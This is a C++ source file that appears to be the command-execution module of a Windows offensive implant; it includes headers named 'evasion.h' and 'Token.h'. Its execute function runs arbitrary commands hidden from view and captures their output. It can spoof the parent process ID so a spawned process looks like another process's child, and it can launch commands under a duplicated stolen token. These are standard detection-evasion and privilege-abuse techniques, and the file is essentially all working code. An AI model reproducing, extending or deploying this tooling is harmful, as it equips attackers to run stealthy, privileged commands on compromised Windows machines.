#include <windows.h>
#include "taskRunner.h"
#include "evasion.h"
#include <format>
#include "Token.h"

#define BUF_SIZE 4096
namespace taskrunner {
	string readFromPipe(HANDLE pipe_handle) {
		char buffer[BUF_SIZE] = { 0 };
		DWORD dwRead = 0;
		string out;
		while (1) {
			auto bSuccess = ReadFile(pipe_handle, buffer, BUF_SIZE, &dwRead, NULL);
			if (!bSuccess) {
				break;
			}
			else if (dwRead == 0)
				break;
			else
				out.append(buffer,dwRead);
		}
		return out;
	}
	string execute(string& error,const string& cmd, bool capture, int ppid, bool usetoken) {
		STARTUPINFOEXW si = { 0 };
		PROCESS_INFORMATION pi;
		SIZE_T attributeSize;
		HANDLE parentProcessHandle = INVALID_HANDLE_VALUE;
		ZeroMemory(&si, sizeof(STARTUPINFOEXW));
		ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

		HANDLE g_hChildStd_OUT_Rd = NULL;
		HANDLE g_hChildStd_OUT_Wr = NULL;
		HANDLE hPipeDup = INVALID_HANDLE_VALUE;

		if (ppid != 0) {
			parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, ppid);
			if (parentProcessHandle == INVALID_HANDLE_VALUE) {
				error = std::format("OpenProcess failed with error: {}", GetLastError());
				return "";
			}
			InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
			si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
			InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
			UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
			si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
		}
		else {
			si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
			InitializeProcThreadAttributeList(NULL, 0, 0, &attributeSize);
			si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeSize);
		}
		if (capture) {
			SECURITY_ATTRIBUTES saAttr;
			// Set the bInheritHandle flag so pipe handles are inherited. 

			saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
			saAttr.bInheritHandle = TRUE;
			saAttr.lpSecurityDescriptor = NULL;
			if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
				error = "StdoutRd CreatePipe";
				return "";
			}
			if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)) {
				error = "StdoutRd CreatePipe";
				return "";
			}
			if (ppid) {
				if (!DuplicateHandle(GetCurrentProcess(), g_hChildStd_OUT_Wr, parentProcessHandle, &hPipeDup, 0, true, DUPLICATE_SAME_ACCESS)) {
					throw exception(std::format("duplicate Handle failed with error: {}", GetLastError()).c_str());
				}
				si.StartupInfo.hStdOutput = hPipeDup;
				si.StartupInfo.hStdError = hPipeDup;
			}
			else {
				si.StartupInfo.hStdOutput = g_hChildStd_OUT_Wr;
				si.StartupInfo.hStdError = g_hChildStd_OUT_Wr;
			}
			si.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;
		}
		BOOL res = FALSE;
		std::wstring wscmd(cmd.size(), L' '); // Overestimate number of code points.
		wscmd.resize(std::mbstowcs(&wscmd[0], cmd.c_str(), cmd.size())); // Shrink to fit.
		if (usetoken) {
			HANDLE hPrimaryToken = INVALID_HANDLE_VALUE;
			if(!DuplicateTokenEx(token::getToken(), TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &hPrimaryToken))
				throw exception(std::format("[-] DuplicateTokenEx failed with error: {}", GetLastError()).c_str());
			res = CreateProcessWithTokenW(hPrimaryToken, 0, NULL, (LPWSTR)wscmd.c_str(), CREATE_NO_WINDOW, NULL, NULL, &si.StartupInfo, &pi);
			CloseHandle(hPrimaryToken);
		}
		else {
			res = CreateProcessW(NULL, (LPWSTR)wscmd.c_str(), NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, NULL, NULL, &si.StartupInfo, &pi);
		}
		if (!res) {
			throw exception(std::format("[-] CreateProcessW failed with error: {}", GetLastError()).c_str());
		}
		DeleteProcThreadAttributeList(si.lpAttributeList);
		HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
		
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(g_hChildStd_OUT_Wr);
		if (hPipeDup != INVALID_HANDLE_VALUE) {
			if (!DuplicateHandle(parentProcessHandle, hPipeDup, NULL,
				&hPipeDup, 0, FALSE, DUPLICATE_CLOSE_SOURCE))
				throw exception(std::format("[-] Duplicate Handle failed with error: {}", GetLastError()).c_str());
		}
		auto out = readFromPipe(g_hChildStd_OUT_Rd);
		CloseHandle(g_hChildStd_OUT_Rd);
		CloseHandle(hPipeDup);
		return out;
	}
}